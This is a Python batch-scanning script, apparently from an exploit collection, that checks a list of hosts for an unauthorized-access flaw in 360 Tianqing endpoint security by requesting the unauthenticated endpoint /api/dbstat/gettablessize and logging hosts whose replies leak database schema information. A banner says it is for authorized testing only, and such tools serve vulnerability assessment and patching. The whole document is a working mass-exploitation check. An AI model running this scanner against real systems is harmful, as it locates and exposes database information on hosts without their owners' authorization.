#!/usr/bin/python3

import argparse
import requests
import urllib.parse

requests.packages.urllib3.disable_warnings();#用于屏蔽SSL证书提醒

def banner():
    print("");
    print("***********************************************************");
    print("360天擎-越权访问导致数据库信息泄露-漏洞批量检测工具");
    print("Author: ybdt");
    print("Created: 2021/04/17");
    print("Link: https://github.com/ybdt/exp-hub/");
    print("***********************************************************");
    print("");
    print("*************************警 告*****************************");
    print("本工具旨在帮助企业快速定位漏洞、修复漏洞,仅限授权安全测试使用!");
    print("请严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!");
    print("***********************************************************");
    print("");
    print("");

def usage():
    parser = argparse.ArgumentParser(description="注意：每行IP需要指明协议，即以协议开头");
    parser.add_argument("file",
                        help="包含IP列表的文件，IP每行一个");
    args = parser.parse_args();
    ip_file = args.file
    return ip_file;

def main():
    
    banner();
    
    ip_file = usage();

    with open(ip_file, "r") as f_r:
        with open("result.txt", "w") as f_w:
            lines = f_r.readlines();
            for line in lines:
                ip = line.strip("\n");
                full_url = ip + "/api/dbstat/gettablessize";
                try:
                    if full_url.startswith("https"):
                        r = requests.get(full_url, verify=False);
                    elif full_url.startswith("http"):
                        r = requests.get(full_url);
                    else:
                        print(ip + "-----None web protocol, exiting...");
                        exit();
                except requests.exceptions.SSLError:
                    print(ip + "-----Exception: requests.exceptions.SSLError");
                    continue;
                except requests.exceptions.ConnectionError:
                    print(ip + "-----Exception: requests.exceptions.ConnectionError");
                    continue;
                if r.status_code == 500:
                    print(ip + "-----500: Internal Error");
                    continue;
                elif r.status_code == 401:
                    print(ip + "-----401: Unauthorized");
                    continue;
                elif r.status_code == 404:
                    print(ip + "-----404: Not Found");
                    continue;
                elif r.status_code == 400:
                    print(ip + "-----400: Bad Request");
                    continue;
                elif r.status_code == 200:
                    if "schema_name" in r.text:
                        print(ip + "-----200: Vulnerable");
                        f_w.write(ip + "\n");
                    else:
                        print(ip + "-----200: 需要进一步查看");
                        f_w.write(ip + "-----200: 需要进一步查看" + "\n");
                else:
                    print(full_url + "-----Return code unknown, exiting...");
                    exit();

main();